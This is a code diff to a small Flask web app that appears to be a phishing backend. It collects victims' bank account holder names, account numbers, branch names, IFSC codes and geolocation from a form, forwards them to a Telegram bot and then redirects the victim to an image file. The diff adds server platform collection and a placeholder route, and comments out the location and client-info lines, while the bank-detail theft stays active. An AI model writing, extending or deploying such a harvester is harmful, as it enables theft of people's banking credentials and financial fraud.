@@ -1,6 +1,7 @@
 from flask import Flask, request, render_template, redirect, url_for
 import telebot
 import os
+import platform
 
 # Load environment variables and initialize Flask and Telebot
 app = Flask(__name__)
@@ -21,26 +22,32 @@ def submit():
     branch_name = request.form.get('branch_name')
     ifsc_code = request.form.get('ifsc_code')
 
-    # Retrieve location, device, and system info
+    # Retrieve location data
     latitude = request.form.get('latitude')
     longitude = request.form.get('longitude')
-    user_agent = request.form.get('user_agent')
-    browser_info = request.form.get('browser_info')
-    screen_resolution = request.form.get('screen_resolution')
-    device_info = request.form.get('device_info')
 
-    # Format message for Telegram
+    # Retrieve client system information from the user agent
+    user_agent = request.headers.get('User-Agent')
+
+    # Retrieve server system information
+    system_info = {
+        "OS": platform.system(),
+        "OS Version": platform.version(),
+        "Machine": platform.machine(),
+        "Processor": platform.processor(),
+        "Python Version": platform.python_version()
+    }
+
+    # Format the message for Telegram
     telegram_message = (
         f"New Bank Details Submission:\n"
         f"Account Holder Name: {account_holder}\n"
         f"Account Number: {account_number}\n"
         f"Branch Name: {branch_name}\n"
         f"IFSC Code: {ifsc_code}\n"
-        f"Location: Latitude: {latitude}, Longitude: {longitude}\n"
-        f"User Agent: {user_agent}\n"
-        f"Browser Info: {browser_info}\n"
-        f"Screen Resolution: {screen_resolution}\n"
-        f"Device Type: {device_info}"
+      #  f"Location: {latitude}, {longitude}\n"
+      #  f"Client Info: {user_agent}\n"
+     #   f"Server Info: {system_info}"
     )
 
     # Send message to Telegram
@@ -48,6 +55,11 @@ def submit():
 
     # Redirect to a specific URL
     return redirect("https://files.catbox.moe/3cd0gt.jpeg")
+
+# Define the /urlhere route
+@app.route('/urlhere')
+def urlhere():
+    return "You have been redirected here!"
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
